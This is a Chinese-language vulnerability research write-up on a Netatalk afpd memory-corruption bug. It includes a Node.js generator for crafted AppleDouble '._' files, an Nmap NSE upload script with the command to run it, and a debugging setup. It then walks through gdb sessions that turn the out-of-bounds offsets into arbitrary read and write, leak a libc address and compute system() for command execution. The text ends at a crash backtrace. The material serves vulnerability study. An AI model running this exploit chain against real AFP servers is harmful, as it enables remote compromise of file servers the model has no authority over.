var fp = \u0026#39;./\u0026#39; var origname = \u0026#39;read\u0026#39; // resource fork data 部分： var buffer2 = Buffer.from(\u0026#34;a\u0026#34;.repeat(0x12)) var buffer3 = Buffer.from(\u0026#34;a\u0026#34;.repeat(0x34)) console.log(Buffer.concat([ buffer2, buffer3]).length) // 打印的 resource fork data 长度。 resoLength = Buffer.concat([buffer2, buffer3]).length var findoff = args[\u0026#39;findoff\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;findoff\u0026#39;]) var findlen = args[\u0026#39;findlen\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;findlen\u0026#39;]) var forklen = args[\u0026#39;forklen\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;forklen\u0026#39;]) var forkoff = args[\u0026#39;forkoff\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;forkoff\u0026#39;]) // 如果name为空则为read var name = args[\u0026#34;name\u0026#34;] == undefined ? origname : args[\u0026#34;name\u0026#34;] console.log(\u0026#39;findoff:\u0026#39; + findoff + \u0026#34; findlen:\u0026#34; + findlen + \u0026#34; forkoff:\u0026#34; + forkoff + \u0026#34; forklen:\u0026#34; + forklen) var buffer = xattr.create({ \u0026#34;com.example.Attribute\u0026#34;: \u0026#34;my data\u0026#34; }, resoLength, findoff, findlen, forkoff, forklen); var buffer4 = Buffer.concat([buffer, buffer2, buffer3]) fs.writeFile(fp + \u0026#39;._\u0026#39; + name, buffer4, { mode: 0o777 }, err =\u0026gt; { if (err) { console.error(err) return } else { console.log(\u0026#34;success write file, file path: \u0026#34; + fp + \u0026#39;._\u0026#39; + name) } //文件写入成功。 } ) fs.writeFile(fp + name, \u0026#34;hello world\u0026#34;, { mode: 0o777 }, err =\u0026gt; { if (err) { console.error(err) return } else { console.log(\u0026#34;success write file, file path: \u0026#34; + fp + name) } //文件写入成功。 } ) fs.chmod(fp+ name, 0o777, () =\u0026gt; { console.log(\u0026#34;change \u0026#34; + fp+ name + \u0026#34; mode\u0026#34;) }) fs.chmod(fp + \u0026#39;._\u0026#39; + name, 0o777, () =\u0026gt; { console.log(\u0026#34;change \u0026#34; + fp + \u0026#39;._\u0026#39; + name + \u0026#34; mode\u0026#34;) }) 如何将文件上传到服务器\n生成文件后，为了更贴合实际漏洞利用场景，即生成有效AppleDouble文件后通过AFP客户端上传到AFP服务器，这里借鉴Nmap自带的afp的lua库，编写我们自己的上传NSE脚本。\n在Nmap中原生包含了afp-ls的NSE脚本，其引用的lua库afp.lua内含有我们通过AFP协议上传文件需要的接口WriteFile，在上传文件的NSE脚本中调用该接口即可\n在scripts目录下新建afp-upfile.nse文件，将afp-ls.nse内容粘贴进去，去掉列出文件逻辑的代码，之后编写lua代码，读取文件，将文件内容传给afp.lua内的WriteFile函数即可，最终如下：\n...... action = function(host, port) -- 这里和afp-ls的逻辑一样 local msg local uploadpath = args[\u0026#34;uploadpath\u0026#34;] local filepath = args[\u0026#34;filepath\u0026#34;] local poc = io.open(filepath,\u0026#34;r\u0026#34;) local data = poc:read(\u0026#34;*all\u0026#34;) poc:close() status, msg = afpHelper:WriteFile(uploadpath, data) status, response = afpHelper:Logout() status, response = afpHelper:CloseSession() return data end return end 利用该脚本，可以通过nmap上传文件到afp服务器\nnmap -p 548 --script=afp-upfile --script-args \u0026#34;uploadpath=test/._cmd,filepath=./._cmd\u0026#34; ip 漏洞成因 libatalk/adouble/ad_open.c#parse_entries 函数为Nettatalk解析buf内的数据到自定义的结构体，通过读取buf内对应offset的数据到传入的ad指针指向的adouble结构体的某些成员内，完成对相应值的设置，其中buf数据来自读取的._filename的文件。在循环中将buf首地址加上某个offset中的数据通过memcpy函数拷贝到ad指向的adouble结构体变量内，在循环内含有一个if判断，当处于以下情况时，parse_entries 会返回-1并且打印警告日志\neid \u0026gt; ADEID_MAX，ADEID_MAX=20 off\u0026gt;sizeof(ad-\u0026gt;ad_data) eid不等于2并且此时的entry的偏移和数据长度相加大于1024 即通过控制文件内的数据，我们可以控制adouble结构体内的entry的off+len使得entry.off+entry.len+buf超过buf的边界，正常流程中adouble结构体内的entry的off+len+buf不应该越过buf边界。\nstatic int parse_entries(struct adouble *ad, char *buf, uint16_t nentries) { uint32_t eid, len, off; int ret = 0; /* now, read in the entry bits */ for (; nentries \u0026gt; 0; nentries-- ) { memcpy(\u0026amp;eid, buf, sizeof( eid )); eid = get_eid(ntohl(eid)); buf += sizeof( eid ); memcpy(\u0026amp;off, buf, sizeof( off )); off = ntohl( off ); buf += sizeof( off ); memcpy(\u0026amp;len, buf, sizeof( len )); len = ntohl( len ); buf += sizeof( len ); ad-\u0026gt;ad_eid[eid].ade_off = off; ad-\u0026gt;ad_eid[eid].ade_len = len; if (!eid || eid \u0026gt; ADEID_MAX || off \u0026gt;= sizeof(ad-\u0026gt;ad_data) || ((eid != ADEID_RFORK) \u0026amp;\u0026amp; (off + len \u0026gt; sizeof(ad-\u0026gt;ad_data)))) // ADEID_RFORK { ret = -1; LOG(log_warning, logtype_ad, \u0026#34;parse_entries: bogus eid: %u, off: %u, len: %u\u0026#34;, (uint)eid, (uint)off, (uint)len); } } return ret; } // adouble 定义 struct adouble { ...... char ad_data[AD_DATASZ_MAX]; //AD_DATASZ_MAX = 1024 }; 在代码里，在以下几处函数中有调用parse_entries 函数\nad_header_read ad_header_read_osx ad_header_read_ea 在三处函数中，只有libatalk/adouble/ad_open.c#ad_header_read_osx函数调用parse_entries函数时，即使parse_entries返回-1，该函数不会return也不会进入异常处理流程，仅仅是通过日志记录，继续执行而不报错。\nif (parse_entries(\u0026amp;adosx, buf, nentries) != 0) { LOG(log_warning, logtype_ad, \u0026#34;ad_header_read(%s): malformed AppleDouble\u0026#34;, path ? fullpathname(path) : \u0026#34;\u0026#34;); } 之后ad_header_read_osx 会读取adouble结构体内的偏移，判断finderinfo的entry len是否等于32，不等于则进入if内，并调用libatalk/adouble/ad_open.c#ad_convert_osx 函数\n在ad_convert_osx 函数中会读取ad指针指向的adouble结构体内的entry结构的off和len偏移并调用memmove函数进行内存复制，此偏移恰好是parse_entries 函数从文件读取并赋值的偏移。\nstatic int ad_convert_osx(const char *path, struct adouble *ad) { ...... origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK); map = mmap(NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), 0); if (map == MAP_FAILED) { LOG(log_error, logtype_ad, \u0026#34;mmap AppleDouble: %s\\n\u0026#34;, strerror(errno)); EC_FAIL; } memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI, map + ad_getentryoff(ad, ADEID_RFORK), ad_getentrylen(ad, ADEID_RFORK)); (void)ad_rebuild_adouble_header_osx(ad, map); munmap(map, origlen); 分析函数调用链 通过\rdoxygen+graphviz绘制函数调用链图，从图中可以看出完整的函数调用链为：ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries\n而ad_open函数所在的libatalk目录内的代码会被编译为libatalk.so，最终被afpd服务使用，在afpd 代码中，由etc/afpd/fork.c#afp_openfork 调用libatalk/adouble/ad_open.c#ad_open函数。\nint afp_openfork(AFPObj *obj _U_, char *ibuf, size_t ibuflen _U_, char *rbuf, size_t *rbuflen) { ..... /* First ad_open(), opens data or ressource fork */ if (ad_open(ofork-\u0026gt;of_ad, upath, adflags, 0666) \u0026lt; 0) { ..... 在libatalk/adouble/ad_open.c#ad_open 函数中，当请求内设置了ADFLAGS_RF这个flag才会调用ad_open_rf函数\nif (adflags \u0026amp; ADFLAGS_RF) { // ADFLAGS_RF = 1\u0026lt;\u0026lt;1 = 2 if (ad_open_rf(path, adflags, mode, ad) != 0) { EC_FAIL; } } 触发漏洞流程 想要触发该漏洞，必须要了解到afpd服务如何处理客户端请求，以便构造请求执行到漏洞代码处。\n启动Netatalk的服务端afpd服务后，在afpd的main函数入口处初始化一些变量、加载AFP配置、监听端口等。\nint main(int ac, char **av) { struct sigaction\tsv; sigset_t sigs; int ret; ...... if (afp_config_parse(\u0026amp;obj, \u0026#34;afpd\u0026#34;) != 0) ..... obj.options.save_mask = umask(obj.options.umask); ...... while (1) { ....... for (int i = 0; i \u0026lt; asev-\u0026gt;used; i++) { if (asev-\u0026gt;fdset[i].revents \u0026amp; (POLLIN | POLLERR | POLLHUP | POLLNVAL)) { switch (asev-\u0026gt;data[i].fdtype) { case LISTEN_FD: if ((child = dsi_start(\u0026amp;obj, (DSI *)(asev-\u0026gt;data[i].private), server_children))) { if (!(asev_add_fd(asev, child-\u0026gt;afpch_ipc_fd, IPC_FD, child))) { ..... kill(child-\u0026gt;afpch_pid, SIGKILL); } } break; ...... } 之后进入while循环，调用 etc/afpd/main.c#dsi_start，dsi_start 调用dsi_getsession ，在dsi_getsession中调用dsi-\u0026gt;proto_open 函数指针，实际指向libatalk/dsi/dsi_tcp.c#dsi_tcp_open\nstatic afp_child_t *dsi_start(AFPObj *obj, DSI *dsi, server_child_t *server_children) { afp_child_t *child = NULL; if (dsi_getsession(dsi, server_children, obj-\u0026gt;options.tickleval, \u0026amp;child) != 0) { ...... } /* we\u0026#39;ve forked. */ if (child == NULL) { configfree(obj, dsi); afp_over_dsi(obj); /* start a session */ exit (0); } return child; } int dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp) { // 设置、初始化变量等操作，通过fork函数创建子进程 switch (pid = dsi-\u0026gt;proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */ ...... } dsi_tcp_open函数接收来自客户端的连接，通过fork函数创建子进程\nstatic pid_t dsi_tcp_open(DSI *dsi) { pid_t pid; SOCKLEN_T len; len = sizeof(dsi-\u0026gt;client); dsi-\u0026gt;socket = accept(dsi-\u0026gt;serversock, (struct sockaddr *) \u0026amp;dsi-\u0026gt;client, \u0026amp;len); ...... if (0 == (pid = fork()) ) { /* child */ ...... } /* send back our pid */ return pid; } 返回到dsi_getsession函数中，当fork返回的pid为0时，即当前进程为子进程则跳出switch结构，进入处理DSI数据的逻辑，当返回的pid不为0也不为-1时，即当前进程为父进程，则返回到dsi_start函数。\nint dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp) { // 设置、初始化变量等操作 switch (pid = dsi-\u0026gt;proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */ case -1: ...... case 0: // 如果是子进程则直接退出switch，进入处理DSI数据的逻辑 break; default: //如果是父进程则返回到dsi_start函数 ...... dsi-\u0026gt;proto_close(dsi); *childp = child; return 0; } .... switch (dsi-\u0026gt;header.dsi_command) { // 根据dsi命令执行不同动作 case DSIFUNC_STAT: /* send off status and return */ ..... case DSIFUNC_OPEN: /* setup session */ /* set up the tickle timer */ dsi-\u0026gt;timer.it_interval.tv_sec = dsi-\u0026gt;timer.it_value.tv_sec = tickleval; dsi-\u0026gt;timer.it_interval.tv_usec = dsi-\u0026gt;timer.it_value.tv_usec = 0; dsi_opensession(dsi); *childp = NULL; return 0; default: /* just close */ LOG(log_info, logtype_dsi, \u0026#34;DSIUnknown %d\u0026#34;, dsi-\u0026gt;header.dsi_command); dsi-\u0026gt;proto_close(dsi); exit(EXITERR_CLNT); } } 之后回到dsi_start函数中，如果当前进程为父进程则返回到main函数中的while循环中，等待客户端的连接。如果当前进程为子进程则调用afp_over_dsi函数处理AFP数据，根据不同的AFP命令调用全局变量afp_switch[]内的不同函数指针进行处理\nvoid afp_over_dsi(AFPObj *obj) { ...... /* get stuck here until the end */ while (1) { ...... cmd = dsi_stream_receive(dsi); ...... switch(cmd) { case DSIFUNC_CLOSE: ...... case DSIFUNC_TICKLE: ...... case DSIFUNC_CMD: ...... function = (u_char) dsi-\u0026gt;commands[0]; /* send off an afp command. in a couple cases, we take advantage * of the fact that we\u0026#39;re a stream-based protocol. */ if (afp_switch[function]) { dsi-\u0026gt;datalen = DSI_DATASIZ; dsi-\u0026gt;flags |= DSI_RUNNING; LOG(log_debug, logtype_afpd, \u0026#34;\u0026lt;== Start AFP command: %s\u0026#34;, AfpNum2name(function)); AFP_AFPFUNC_START(function, (char *)AfpNum2name(function)); err = (*afp_switch[function])(obj, (char *)dsi-\u0026gt;commands, dsi-\u0026gt;cmdlen, (char *)\u0026amp;dsi-\u0026gt;data, \u0026amp;dsi-\u0026gt;datalen); ...... } /* error */ afp_dsi_die(EXITERR_CLNT); } afp_switch被preauth_switch初始化，里面只有少量函数指针，而在postauth_switch中含有大量函数指针，推测为经过身份验证后afp_switch被postauth_switch赋值\nstatic AFPCmd preauth_switch[] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,\t/* 0 - 7 */ NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,\t/* 8 - 15 */ NULL, NULL, afp_login, afp_logincont, afp_logout, NULL, NULL, NULL,\t/* 16 - 23 */ ..... }; AFPCmd *afp_switch = preauth_switch; AFPCmd postauth_switch[] = { NULL, afp_bytelock, afp_closevol, afp_closedir, afp_closefork, afp_copyfile, afp_createdir, afp_createfile,\t/* 0 - 7 */ afp_delete, afp_enumerate, afp_flush, afp_flushfork, afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,\t/* 8 - 15 */ afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont, afp_logout, afp_mapid, afp_mapname, afp_moveandrename,\t/* 16 - 23 */ afp_openvol, afp_opendir, afp_openfork, afp_read, afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams, /* 24 - 31 */ afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams, afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, /* 32 - 39 */ afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch, afp_null, afp_null, afp_null, afp_null,\t/* 40 - 47 */ afp_opendt, afp_closedt, afp_null, afp_geticon, afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,\t/* 48 - 55 */ afp_addcomment, afp_rmvcomment, afp_getcomment, NULL, ...... }; static int set_auth_switch(const AFPObj *obj, int expired) { ...... afp_switch = postauth_switch; 在函数调用链中，afp_openfork在afp_switch的下标为26，同时26也可以在AFP数据包内看到：\n调用总结\n总结以上触发流程，触发到afp_openfork函数需要AFP数据包内Command字段值为26同时需要设置ADFLAGS_RF 这个flag，触发漏洞链条为：afp_openfork-\u0026gt;ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries。\n函数调用图如下：\n如何发送FPOpenFork请求\n前面说过在nmap中含有afp相关的脚本，在nmap自带的lua库afp.lua中含有读取文件相关的函数，调用之，最终nse脚本如下，需要注意的是，在FPOpenFork请求中必须设置ADFLAGS_RF 这个flag才会触发到漏洞函数逻辑，在nmap自带的afp.lua的ReadFile函数中，该flag写死为0，需要修改为0x2，请求中的ADFLAGS_RF 才会被设置。\naction = function(host, port) -- 和afp-ls逻辑一样 local str_path = args[\u0026#34;path\u0026#34;] local content status, content = afpHelper:ReadFile(str_path) status, response = afpHelper:Logout() status, response = afpHelper:CloseSession() return content end return end 文件内应该包含什么\n在函数调用链中的ad_header_read_osx 函数中，有备注*Read an ._ file, only uses the resofork, finderinfo is taken from EA ，该函数只会使用resofork 和finderinfo 这两种entry，*所以在生成触发该漏洞的文件时只需要包含这两种entry即可。\n环境搭建 这里使用Netatalk 3.1.11版本搭建\n系统版本 Ubuntu 1804\n内核版本\nroot@ubuntu:~/nettatalk/netatalk-3.1.11/build/sbin/genefile# uname -a Linux ubuntu 5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux libc版本 libc-2.31.so\nNetatalk编译\napt-get install -y libdb-dev libgcrypt-dev libcrack2-dev libgssapi-krb5-2 libgssapi3-heimdal libgssapi-perl libkrb5-dev libtdb-dev libevent-dev libdb-dev wget https://versaweb.dl.sourceforge.net/project/netatalk/netatalk/3.1.11/netatalk-3.1.11.tar.bz2 tar -xjf netatalk-3.1.11.tar.bz2 cd netatalk-3.1.11.tar.bz2 mkdir build export CFLAGS=\u0026#39;-g -O0\u0026#39; # 保留调试符号，方便调试 ./configure \\ --with-init-style=debian-systemd \\ --without-libevent \\ --without-tdb \\ --with-cracklib \\ --enable-krbV-uam \\ --enable-debug \\ --with-pam-confdir=/etc/pam.d \\ --with-dbus-daemon=/usr/bin/dbus-daemon \\ --with-dbus-sysconf-dir=/etc/dbus-1/system.d \\ --with-tracker-pkgconfig-version=1.0 \\ --prefix=`pwd`/build \\ --bindir=`pwd`/build/bin \\ --sbindir=`pwd`/build/sbin make make install Netatalk配置\nmkdir /tmp/afp_tmp/ mkdir /tmp/afp_tmp/Public mkdir /tmp/afp_tmp/test echo test \u0026gt; /tmp/afp_tmp/test/test.txt echo hello \u0026gt; /tmp/afp_tmp//Public/hello.txt chmod 777 -R /tmp/afp_tmp/Public /tmp/afp_tmp/test /tmp/afp_tmp/afp.conf: [ Global ] uam list = uams_guest.so,uams_clrtxt.so,uams_dhx2.so save password = no unix charset = UTF8 use sendfile = yes zeroconf = no guest account = nobody [ Public ] path =/tmp/afp_tmp/Public ea = auto convert appledouble = no stat vol = no file perm = 777 directory perm = 777 veto files = \u0026#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/\u0026#39; rwlist = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; valid users = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; invalid users = [ test ] path = /tmp/afp_tmp/test ea = auto convert appledouble = no stat vol = no file perm = 777 directory perm = 777 veto files = \u0026#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/\u0026#39; rwlist = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; valid users = \u0026#34;admin\u0026#34;,\u0026#34;nobody\u0026#34;,\u0026#34;@allaccount\u0026#34; invalid users = 参考：\nhttps://nosec.org/home/detail/4997.html\n调试 在AFPD中，由子进程负责处理AFP请求，父进程则循环接受客户端的请求，所以这里只需要调试子进程即可，为了方便调试，编写了如下脚本，至于为什么设置条件断点b ad_open.c:1894 if adflags \u0026amp; 2 != 0 在后文说明。\nt.sh gdb -x debug.gdb attach `ps -ef | grep afpd | grep -v grep | grep -v cnid |awk \u0026#39;{print $2}\u0026#39; | head -1` debug.gdb set follow-fork-mode child set detach-on-fork off set schedule-multiple on b ad_open.c:1894 if adflags \u0026amp; 2 != 0 c b ad_open.c:617 b ad_open.c:605 启动AFPD服务\n./afpd -d -F /tmp/afp_tmp/afpd.conf ./cnid_metad -d -F /tmp/afp_tmp/afpd.conf 为什么要设置条件断点 将前面生成的appledouble文件通过nmap脚本上传到afp服务器，通过nmap脚本请求该文件触发该漏洞\n如果断点没有设置if adflags \u0026amp; 2 != 0 这个条件则gdb会直接断在ad_open.c:1894，此时请求内ADFLAGS_RF 值为0，不能进入漏洞逻辑，而由于断点，afp无法及时回复nmap数据包，nmap会报超时。\n继续执行的话，afpd会收到SIGALRM信号，无法进入漏洞逻辑\n正常调试 上传的._read文件到test目录：\n触发漏洞，进入parse_entries函数内，parse_entries读取buf里面的数据到ad指向的adouble结构体中。\n最终adouble结构体内entry成员变量被设置为如下值，可以看出finderinfo entry内的off已经越界了：\n而正常appledouble文件内，每个entry.ade_off+entry.ad_len相加应该小于文件大小，在上图中第九个entry即finderinfo的entry.ade_off+entry.ad_len = A27 \u0026gt;文件大小，这个偏移也可以从文件内体现，此时finderinfo的off已越界，此时已经控制了adouble.entry.off。\n如何利用entry内的越界 前面写到，parse_entries函数可以将adouble结构体内的entry的off和len相加大于文件大小，如果某个地方读取了这个off和len并作为offset读写数据则可能产生越界读写。\n继续看ad_header_read_osx调用parse_entries之后的逻辑，在parse_entries中如果程序发现off+len越界则会返回-1，如果ad指向的adouble结构体内的finderinfo entry的ade_len不等于32则进入if逻辑内，调用到ad_convert_osx函数。\n在ad_convert_osx函数中，程序将appledouble文件映射到内存中，此时对文件映射的内存的读写即是对该文件的读写。ad_convert_osx函数映射之后调用了memmove和ad_rebuild_adouble_header_osx函数，之后通过munmap函数取消映射，将内存中的数据写入文件内。\nmmap的长度参数origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK)即ad.ADEID_RFORK.off + ad.ADEID_RFORK.len 都为可控值\nstatic int ad_convert_osx(const char *path, struct adouble *ad) { ...... origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK); map = mmap(NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), 0); ...... memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI, map + ad_getentryoff(ad, ADEID_RFORK), ad_getentrylen(ad, ADEID_RFORK)); . (void)ad_rebuild_adouble_header_osx(ad, map); munmap(map, origlen); ...... } #define ad_getentrylen(ad,eid) ((ad)-\u0026gt;ad_eid[(eid)].ade_len) long ad_getentryoff(const struct adouble *ad, int eid) { if (ad-\u0026gt;ad_vers == AD_VERSION2) return ad-\u0026gt;ad_eid[eid].ade_off; switch (eid) { case ADEID_DFORK: return 0; case ADEID_RFORK: #ifdef HAVE_EAFD return 0; #else return ad-\u0026gt;ad_eid[eid].ade_off; #endif default: return ad-\u0026gt;ad_eid[eid].ade_off; } /* deadc0de */ AFP_PANIC(\u0026#34;What am I doing here?\u0026#34;); } mmap之后文件已映射到内存中，在经过多次测试后，当resource fork length + resource fork offset ≤1000 时会mmap分配的内存在ld.sodata段上面。\n任意写\n仔细看调用memmove时的参数，map为文件映射到内存的首地址，ad_getentryoff为获取指定entry id的entry的off，ADEDLEN_FINDERI为宏定义值为32=0x20，而我们可以控制各个entry的off和len，通过该处调用，即我们可以从map + ad.ADEID_RFORK.off处读取任意长度的数据写入到任何高于map+0x20的内存（前提是该地址可写）也就是将文件中ad.ADEID_RFORK.off 处的数据写入该内存，而ad.ADEID_FINDERI.off和ad.ADEID_RFORK.off都为可控值，即可达到任意写。\nmemmove(map + ad.ADEID_FINDERI.off + 0x20, map + ad.ADEID_RFORK.off, ad.ADEID_RFORK.len); 任意读\n任意读发生在任意写的后面的函数调用，在ad_rebuild_adouble_header_osx 函数中有如下语句，该语句将ad.ad_data+ad.ADEID_FINDERI.off 处开始长为0x20的数据写入到adbuf+ADEDOFF_FINDERI_OSX中，ADEDOFF_FINDERI_OSX为宏定义，展开后可得值为26+2*12=50=0x32，而adbuf为mmap映射后返回的内存地址，该处语句将数据写入到mmap映射的内存偏移0x32的位置。\n#define ad_entry(ad,eid) ((caddr_t)(ad)-\u0026gt;ad_data + (ad)-\u0026gt;ad_eid[(eid)].ade_off) int ad_rebuild_adouble_header_osx(struct adouble *ad, char *adbuf) { ...... memcpy(adbuf + ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI); #define ADEDOFF_FINDERI_OSX (AD_HEADER_LEN + ADEID_NUM_OSX*AD_ENTRY_LEN) #define AD_HEADER_LEN (ADEDLEN_MAGIC + ADEDLEN_VERSION + ADEDLEN_FILLER + ADEDLEN_NENTRIES) /* 26 */ #define ADEID_NUM_OSX 2 #define AD_ENTRY_LEN 12 /* size of a single entry header */ 在调用完ad_rebuild_adouble_header_osx 函数后，程序调用munmap函数取消文件映射，内存内的数据会被写回到appledouble文件中，综合有：可以将ad.ad_data+ad.ADEID_FINDERI.off 处开始长为0x20的数据写入到文件偏移0x32处的地方，此时可以通过读取文件获取任意读的内存的内容。\n组合利用\n在内存中ad指向的结构体是存放在栈上的，分配的adouble结构体地址位于ad_header_read_osx栈帧的rbp-0x620处，可以用调试器测算和__libc_start_main_ret的地址\ngef➤ bt #0 0x00007f624307220b in ad_header_read_osx (path=0x7f62430d6bc0 \u0026lt;pathbuf\u0026gt; \u0026#34;._read\u0026#34;, ad=0x558ce325bba0, hst=0x7ffcf6e36990) at ad_open.c:698 #1 0x00007f6243074e50 in ad_open_rf_ea (path=0x558ce2e38f80 \u0026lt;upath\u0026gt; \u0026#34;read\u0026#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1488 #2 0x00007f62430750ae in ad_open_rf (path=0x558ce2e38f80 \u0026lt;upath\u0026gt; \u0026#34;read\u0026#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1529 #3 0x00007f6243075d29 in ad_open (ad=0x558ce325bba0, path=0x558ce2e38f80 \u0026lt;upath\u0026gt; \u0026#34;read\u0026#34;, adflags=0x283) at ad_open.c:1895 #4 0x0000558ce2e143bd in afp_openfork (obj=0x558ce2e4d920 \u0026lt;obj\u0026gt;, ibuf=0x7f6242b6c022 \u0026#34;uthent\u0026#34;, ibuflen=0x12, rbuf=0x558ce3245b10 \u0026#34;\u0026#34;, rbuflen=0x558ce3255b10) at fork.c:364 #5 0x0000558ce2df2c81 in afp_over_dsi (obj=0x558ce2e4d920 \u0026lt;obj\u0026gt;) at afp_dsi.c:627 #6 0x0000558ce2e193ff in dsi_start (obj=0x558ce2e4d920 \u0026lt;obj\u0026gt;, dsi=0x558ce3245420, server_children=0x558ce3242240) at main.c:474 #7 0x0000558ce2e19102 in main (ac=0x4, av=0x7ffcf6e36fc8) at main.c:417 gef➤ i frame 7 Stack frame at 0x7ffcf6e36ee0: rip = 0x558ce2e19102 in main (main.c:417); saved rip = 0x7f6242e51083 caller of frame at 0x7ffcf6e36d80 source language c. Arglist at 0x7ffcf6e36d78, args: ac=0x4, av=0x7ffcf6e36fc8 Locals at 0x7ffcf6e36d78, Previous frame\u0026#39;s sp is 0x7ffcf6e36ee0 Saved registers: rbp at 0x7ffcf6e36ed0, rip at 0x7ffcf6e36ed8 gef➤ p \u0026amp;adosx.ad_data $11 = (char (*)[1024]) 0x7ffcf6e36522 gef➤ p 0x7ffcf6e36ed8 - 0x7ffcf6e36522 $12 = 0x9b6 任意读是读取ad.ad_data+ad.ADEID_FINDERI.off 处长为0x20的数据，而ad.ad_data 距离__libc_start_main_ret为0x9b6，所以可以设置ad.ADEID_FINDERI.off 为0x9b6以获取__libc_start_main_ret地址。利用脚本构造文件并利用NSE脚本上传到服务器\n通过命令触发该漏洞、\n__libc_start_main_ret地址已经回显在文件内\n验证地址:\n在\rhttps://libc.rip 上验证libc版本：\n通过__libc_start_main_ret地址可以测算system函数地址\ngef➤ p 0x7f6242e51083 - 0x24083 + 0x52290 $14 = 0x7f6242e7f290 gef➤ p system $15 = {int (const char *)} 0x7f6242e7f290 \u0026lt;__libc_system\u0026gt; gef➤ 至此，我们得到了system函数地址，那么如何利用这个地址呢？\nNetatalk每次收到客户端请求都是fork子进程处理该请求，父进程继续监听socket，而fork的子进程内存空间和父进程内存空间的内容一样即libc库载入的地址不变，所以可以先发送请求通过任意读获取到system函数地址，第二次发送请求时，由于父进程不变所以system函数地址不变，通过任意写的system函数地址不变，才能达到命令执行的效果。\n正是因为fork后，内存空间不变的机制才能利用任意读获取到system函数地址，而后通过任意写覆盖函数指针达到命令执行的效果。\n在Netatalk执行过程中，程序出错不会立即退出而是会捕获异常，通过任意写，写入了ld.so的数据段，触发错误，导致了如下崩溃：\ngef➤ bt #0 0x00007efeac84c59d in _dl_open (file=0x7efeac733eb9 \u0026#34;libgcc_s.so.1\u0026#34;, mode=0x80000002, caller_dlopen=0x7efeac6acfb9 \u0026lt;init+25\u0026gt;, nsid=0xfffffffffffffffe, argc=0x4, argv=0x7ffd9f27a1e8, env=0x7ffd9f27a210) at dl-open.c:786 #1 0x00007efeac6df8c1 in do_dlopen (ptr=ptr@entry=0x7ffd9f277d60) at dl-libc.c:96 #2 0x00007efeac6e0928 in __GI__dl_catch_exception (exception=exception@entry=0x7ffd9f277d00, operate=operate@entry=0x7efeac6df880 \u0026lt;do_dlopen\u0026gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:208 #3 0x00007efeac6e09f3 in __GI__dl_catch_error (objname=objname@entry=0x7ffd9f277d50, errstring=errstring@entry=0x7ffd9f277d58, mallocedp=mallocedp@entry=0x7ffd9f277d4f, operate=operate@entry=0x7efeac6df880 \u0026lt;do_dlopen\u0026gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:227 #4 0x00007efeac6df9f5 in dlerror_run (args=0x7ffd9f277d60, operate=0x7efeac6df880 \u0026lt;do_dlopen\u0026gt;) at dl-libc.c:46 #5 __GI___libc_dlopen_mode (name=name@entry=0x7efeac733eb9 \u0026#34;libgcc_s.so.1\u0026#34;, mode=mode@entry=0x80000002) at dl-libc.c:195 #6 0x00007efeac6acfb9 in init () at backtrace.c:54 #7 0x00007efeac7834df in __pthread_once_slow (once_control=0x7efeac76fe68 \u0026lt;once\u0026gt;, init_routine=0x7efeac6acfa0 \u0026lt;init\u0026gt;) at pthread_once.c:116 #8 0x00007efeac6ad104 in __GI___backtrace (array=\u0026lt;optimized out\u0026gt;, size=\u0026lt;optimized out\u0026gt;) at backtrace.c:111 #9 0x00007efeac7ec7ff in netatalk_panic (why=0x7efeac818148 \u0026#34;internal error\u0026#34;) at fault.c:93 #10 0x00007efeac7eca69 in fault_report (sig=0xb) at fault.c:127 #11 0x00007efeac7ecac3 in sig_fault (sig=0xb) at fault.c:147 #12 \u0026lt;signal handler called\u0026gt; #13 __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238 #14 0x00007efeac7c10e2 in ad_rebuild_adouble_header_osx (ad=0x7ffd9f279540, adbuf=0x7efeac863000 \u0026#34;\u0026#34;) at ad_flush.c:187 #15 0x00007efeac7c4d4c in ad_convert_osx 